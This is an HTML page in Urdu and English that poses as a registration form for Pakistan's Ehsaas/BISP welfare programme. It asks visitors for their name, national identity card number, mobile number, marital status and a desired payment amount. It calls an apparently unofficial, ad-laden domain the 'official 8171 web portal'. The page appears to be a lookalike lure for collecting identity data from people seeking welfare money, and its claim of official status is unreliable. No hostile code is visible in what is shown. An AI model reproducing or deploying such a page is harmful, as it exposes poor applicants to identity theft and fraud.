<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>Ehsaas Program CNIC Check Online Registration - June 2025</title>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu&display=swap" rel="stylesheet">
  <script src="/static/ehsaas.js"></script>
  <style>
    body {
      background: linear-gradient(to bottom, #e0f7fa, #fff);
      font-family: 'Noto Nastaliq Urdu', serif;
      direction: rtl;
      padding: 40px;
      text-align: center;
    }
    .form-box {
      background: #ffffff;
      padding: 30px;
      margin: auto;
      max-width: 500px;
      border-radius: 15px;
      box-shadow: 0 0 12px rgba(0,0,0,0.15);
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      background: #006400;
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }
    .link-box {
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <h2>اپنے گھرانے کی اہلیت کے بارے میں جانیۓ – Ehsaas Program BISP</h2>
    <form id="ehsaasForm">
      <input type="text" name="name" placeholder="نام" required>
      <input type="text" name="cnic" placeholder="قومی شناختی کارڈ نمبر" required>
      <input type="text" name="mobile" placeholder="موبائل نمبر" required>
      <select name="amount">
        <option value="">آپ کو کتنے پیسے کی ضرورت ہے؟</option>
        <option>2000</option>
        <option>8500</option>
        <option>9000</option>
        <option>12000</option>
        <option>23000</option>
        <option>25000</option>
        <option>36000</option>
      </select>
      <select name="married">
        <option value="">کیا آپ شادی شدہ ہیں؟</option>
        <option>جی ہاں</option>
        <option>نہیں</option>
      </select>
      <button type="submit">درخواست جمع کریں</button>
    </form>
    <div class="link-box">
      Ehsaas Program CNIC check online registration for 25000 now available.<br>
      Or use official 8171 web portal:<br>
      <a href="https://8171ehsaasprogramme.com.pk/#google_vignette" target="_blank">Apply کرنے کے لیے یہاں کلک کریں</a>
    </div>
  </div>
</body>
</html>
